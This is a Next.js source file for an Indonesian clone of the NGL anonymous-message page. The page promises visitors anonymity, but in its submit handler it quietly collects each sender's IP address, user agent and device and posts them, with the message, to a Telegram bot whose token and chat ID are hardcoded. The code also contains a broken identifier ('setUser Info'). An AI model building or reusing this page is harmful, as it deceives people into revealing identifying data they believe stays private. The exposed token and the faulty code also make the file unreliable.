import { useState, useEffect } from "react";
import Head from "next/head";

export default function NGLPage() {
  const [message, setMessage] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState(false);
  const [userInfo, setUserInfo] = useState({
    ip: "Tidak diketahui",
    userAgent: navigator.userAgent,
    device: "Tidak diketahui",
  });

  useEffect(() => {
    // Ambil alamat IP pengguna
    fetch("https://api.ipify.org?format=json")
      .then((res) => res.json())
      .then((data) => {
        const deviceInfo = parseDeviceInfo(navigator.userAgent);
        setUser Info({
          ip: data.ip,
          userAgent: navigator.userAgent,
          device: deviceInfo,
        });
      })
      .catch((err) => {
        console.error("Error fetching IP info:", err);
      });
  }, []);

  const parseDeviceInfo = (userAgent) => {
    // Gunakan regex yang lebih tepat untuk mendeteksi perangkat
    const deviceRegex = /(Android|iPhone|iPad|Windows Phone|Macintosh|Linux|Realme C11|Samsung|Xiaomi|Huawei|Oppo|Vivo|Nokia|Sony|LG|HTC|OnePlus|Google Pixel|Motorola|Asus|Lenovo|BlackBerry|ZTE|TCL|Alcatel|Microsoft)/i;
    const match = userAgent.match(deviceRegex);
    if (match) {
      const deviceDetails = match[0].trim() || "Tidak diketahui";
      return deviceDetails;
    }
    return "Tidak diketahui";
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    const botToken = "8081447655:AAE1q_TUAd3SCToozFnZjdcF9jivRgd3eUU";
    const chatId = "1516343905";
    const username = "minn";

    if (message.trim() === "") {
      alert("Pesan tidak boleh kosong!");
      return;
    }

    setLoading(true);
    setSuccess(false);

    try {
      const response = await fetch(
        `https://api.telegram.org/bot${botToken}/sendMessage`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            chat_id: chatId,
            text: `Pesan anonim dari:
IP: ${userInfo.ip}
USER AGENT: ${userInfo.userAgent}
DEVICE: ${userInfo.device}

PESAN: ${message}`,
          }),
        }
      );

      if (response.ok) {
        setMessage("");
        setSuccess(true);
      } else {
        alert("Gagal mengirim pesan. Coba lagi.");
      }
    } catch (error) {
      alert("Terjadi kesalahan. Coba lagi.");
    } finally {
      setLoading(false);
    }
  };

  const closePopup = () => {
    setSuccess(false);
  };

  return (
    <>
      <Head>
        <title>NGL - MINN</title>
        <link
          href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css"
          rel="stylesheet"
        />
      </Head>
      <div className="container">
        <form onSubmit={handleSubmit}>
          <div className="profile-message-box">
            <div className="profile">
              <img
                src="https://storage.googleapis.com/a1aa/image/oJ3zaGSZ1S6GBJDZ9FXO2tBaBRqAymQqH8SJD06qu6752i8E.jpg"
                alt="Profile picture of a cat"
              />
              <div>
                <div className="username">@minn</div>
                <div className="message">kirimi aku pesan anonim!</div>
              </div>
            </div>
            <textarea
              className="message-box"
              value={message}
              onChange={(e) => setMessage(e.target.value)}
              placeholder="Kirim pesan anonim padaku..."
              disabled={loading}
            ></textarea>
          </div>
          <div className="info">
            <i className="fas fa-lock lock-icon"></i> tanya-jawab anonim
          </div>
          <button type="submit" className="send-button" disabled={loading}>
            {loading ? "Mengirim..." : "Kirim !"}
          </button>
        </form>

        {/* Pop-up Success */}
        {success && (
          <div className="popup-success">
            <div className="popup-content">
              <i className="fas fa-check-circle"></i>
              <p>Pesan berhasil dikirim!</p>
              <button className="popup-close" onClick={closePopup}>
                OK
              </button>
            </div>
          </div>
        )}
      </div>
      <style jsx>{`
        body {
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: flex-start;
            height: 100vh;
            background: linear-gradient(135deg, #ff416c, #ff4b2b, #ffcc00);
            font-family: Arial, sans-serif;
        }

        .container {
            width: 100%;
            max-width: 850px;
            padding: 20px;
            box-sizing: border-box;
            margin-top: 50px;
        }

        .profile-message-box {
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            width: 100%;
            box-sizing: border-box;
        }

        .profile {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }

        .profile img {
            border-radius: 50%;
            width: 130px;
            height: 130px;
            margin-right: 15px;
        }

        .profile .username {
            font-weight: bold;
            font-size: 40px;
        }

        .profile .message {
            margin-top: 2px;
            font-size: 25px;
            color: #555;
        }

        .message-box {
            background: rgba(128, 128, 128, 0.1);
            border-radius: 20px;
            padding: 20px;
            color: rgba(0, 0, 0, 0.5);
            font-size: 30px;
            width: 100%;
            height: 400px;
            resize: none;
            border: none;
            outline: none;
            box-sizing: border-box;
        }

        .info {
            color: white;
            margin-bottom: 20px;
            margin-top: 20px;
            font-size: 30px;
            justify-content: center;
            display: flex;
        }

        .info .lock-icon {
            margin-right: 5px;
        }

        .send-button:hover {
            background: #333;
        }
        .send-button {
          background: black;
          color: white;
          border: none;
          border-radius: 20px;
          padding: 20px 40px;
          font-size: 40px;
          cursor: pointer;
          width: 100%;
          height: 50px;
          box-sizing: border-box;
          transition: background 0.3s ease;
        }
        .send-button:disabled {
          background: #ccc;
          cursor: not-allowed;
        }

        /* Pop-up Success */
        .popup-success {
          position: fixed;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          background: white;
          border-radius: 20px;
          box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
          padding: 30px;
          display: flex;
          align-items: center;
          flex-direction: column;
          z-index: 1000;
          animation: fadeIn 0.3s ease;
        }
        .popup-content i {
          font-size: 50px;
          color: #4caf50;
        }
        .popup-content p {
          margin: 10px 0;
          font-size: 16px;
          font-weight: bold;
          color: #333;
        }
        .popup-close {
          background: #4caf50;
          color: white;
          border: none;
          padding: 10px 20px;
          border-radius: 10px;
          font-size: 14px;
          cursor: pointer;
          margin-top: 15px;
        }
        .popup-close:hover {
          background: #45a047;
        }
        @keyframes fadeIn {
          from {
            opacity: 0;
            transform: translate(-50%, -60%);
          }
          to {
            opacity: 1;
            transform: translate(-50%, - 50%);
          }
        }
      `}</style>
    </>
  );
}